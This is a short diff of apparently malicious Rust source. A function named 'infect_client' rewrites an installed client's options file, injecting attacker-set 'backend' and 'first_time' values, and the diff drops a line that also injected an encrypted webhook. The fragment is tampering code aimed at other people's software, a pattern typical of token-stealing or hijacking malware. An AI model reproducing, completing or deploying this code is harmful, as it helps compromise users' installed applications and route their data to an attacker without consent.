@@ -34,8 +34,6 @@ fn infect_client(
                 let contents = fs::read_to_string(&options_path).unwrap();
 
                 let mut config: Value = serde_json::from_str(&contents).unwrap();
-                config["encrypted_webhook"] =
-                    Value::String(constants::ENCRYPTED_WEBHOOK.to_string());
                 config["backend"] = Value::String(constants::BACKEND.to_string());
                 config["first_time"] = Value::Bool(true);
                 fs::write(&options_path, config.to_string()).unwrap();
